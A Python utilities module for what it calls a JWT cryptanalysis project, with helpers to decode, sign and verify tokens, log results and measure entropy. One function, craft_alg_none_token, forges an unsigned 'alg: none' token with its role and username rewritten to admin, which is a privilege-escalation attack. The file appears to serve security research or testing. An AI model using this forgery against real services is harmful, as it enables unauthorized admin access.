"""
Core utility functions for JWT Cryptanalysis project
"""

import json
import hashlib
import base64
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional
import jwt as pyjwt
from core.jwt_config import PROJECT_ROOT

def decode_jwt_without_verification(token: str) -> Optional[Dict[str, Any]]:
    """
    Decode JWT without verification (for analysis purposes)
    
    Args:
        token: JWT token string
        
    Returns:
        Decoded token dictionary with header, payload, signature
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "full_token": token
        }
    except Exception as e:
        print(f"Error decoding JWT: {e}")
        return None


def encode_jwt(payload: Dict[str, Any], secret: str, algorithm: str = "HS256") -> str:
    """
    Encode and sign a JWT token

    Args:
        payload: JWT payload dictionary
        secret: Secret key for signing
        algorithm: Algorithm to use (default HS256)

    Returns:
        Signed JWT token string
    """
    try:
        return pyjwt.encode(payload, secret, algorithm=algorithm)
    except Exception as e:
        print(f"Error encoding JWT: {e}")
        return None

def get_token_hash(token: str, length: int = 16) -> str:
    """
    Get hash of token for logging (privacy-preserving)
    
    Args:
        token: JWT token string
        length: Length of hash to return
        
    Returns:
        Hashed token (first 'length' characters)
    """
    return hashlib.sha256(token.encode()).hexdigest()[:length]

def craft_alg_none_token(original_token: str, new_role: str = "Admin", new_username: str = "admin") -> str:
    """
    Craft a forged JWT with alg: none
    
    Args:
        original_token: Original JWT token to base structure on
        new_role: Role to assign in forged token
        new_username: Username to assign in forged token
        
    Returns:
        Forged JWT token with alg: none
    """
    try:
        # Decode original token without verification
        parts = original_token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        # Modify payload
        payload['role'] = new_role
        payload['username'] = new_username
        
        # Create new header with alg: none
        new_header = {"alg": "none", "typ": "JWT"}
        
        # Encode header and payload
        header_encoded = base64.urlsafe_b64encode(json.dumps(new_header).encode()).rstrip(b'=').decode()
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
        
        # Return token with empty signature
        return f"{header_encoded}.{payload_encoded}."
    except Exception as e:
        print(f"Error crafting alg:none token: {e}")
        return None

def sign_token_with_secret(payload: Dict[str, Any], secret: str, algorithm: str = "HS256") -> str:
    """
    Sign a JWT payload with given secret
    
    Args:
        payload: JWT payload dictionary
        secret: Secret key for signing
        algorithm: Algorithm to use (default HS256)
        
    Returns:
        Signed JWT token
    """
    try:
        return pyjwt.encode(payload, secret, algorithm=algorithm)
    except Exception as e:
        print(f"Error signing token: {e}")
        return None

def verify_token_with_secret(token: str, secret: str, algorithm: str = "HS256") -> Optional[Dict[str, Any]]:
    """
    Verify JWT token with given secret
    
    Args:
        token: JWT token string
        secret: Secret key for verification
        algorithm: Algorithm to use (default HS256)
        
    Returns:
        Decoded payload if valid, None otherwise
    """
    try:
        return pyjwt.decode(token, secret, algorithms=[algorithm])
    except Exception as e:
        print(f"Error verifying token: {e}")
        return None

def extract_jwt_from_headers(headers: Dict[str, str]) -> Optional[str]:
    """
    Extract JWT token from HTTP Authorization header
    
    Args:
        headers: HTTP headers dictionary
        
    Returns:
        JWT token or None
    """
    auth_header = headers.get("Authorization", "") or headers.get("authorization", "")
    if auth_header.startswith("Bearer "):
        return auth_header[7:]
    return None

def save_json_data(data: Dict[str, Any], file_path: str) -> bool:
    """
    Save data to JSON file
    
    Args:
        data: Data to save
        file_path: Path to save file to
        
    Returns:
        True if successful, False otherwise
    """
    try:
        Path(file_path).parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving JSON: {e}")
        return False

def load_json_data(file_path: str) -> Optional[Dict[str, Any]]:
    """
    Load data from JSON file
    
    Args:
        file_path: Path to JSON file
        
    Returns:
        Loaded data or None
    """
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading JSON: {e}")
        return None

def save_csv_row(file_path: str, row_data: Dict[str, Any], headers: list = None) -> bool:
    """
    Save a row of data to CSV file
    
    Args:
        file_path: Path to CSV file
        row_data: Row data as dictionary
        headers: Column headers (for first row)
        
    Returns:
        True if successful, False otherwise
    """
    try:
        import csv
        Path(file_path).parent.mkdir(parents=True, exist_ok=True)
        
        file_exists = Path(file_path).exists()
        with open(file_path, 'a', newline='') as f:
            if headers:
                writer = csv.DictWriter(f, fieldnames=headers)
                if not file_exists:
                    writer.writeheader()
                writer.writerow(row_data)
            else:
                writer = csv.DictWriter(f, fieldnames=row_data.keys())
                if not file_exists:
                    writer.writeheader()
                writer.writerow(row_data)
        return True
    except Exception as e:
        print(f"Error saving CSV: {e}")
        return False

def get_timestamp() -> str:
    """Get current timestamp in ISO format"""
    return datetime.now().isoformat()

def calculate_entropy(data: str) -> float:
    """
    Calculate Shannon entropy of data
    
    Args:
        data: Input string
        
    Returns:
        Entropy value in bits
    """
    import math
    if not data:
        return 0
    
    entropy = 0
    for char in set(data):
        frequency = data.count(char) / len(data)
        entropy -= frequency * math.log2(frequency)
    
    return entropy

def format_duration(seconds: float) -> str:
    """Format duration in human-readable format"""
    if seconds < 0.001:
        return f"{seconds*1000000:.2f}µs"
    elif seconds < 1:
        return f"{seconds*1000:.2f}ms"
    elif seconds < 60:
        return f"{seconds:.2f}s"
    else:
        minutes = int(seconds / 60)
        secs = seconds % 60
        return f"{minutes}m {secs:.2f}s"
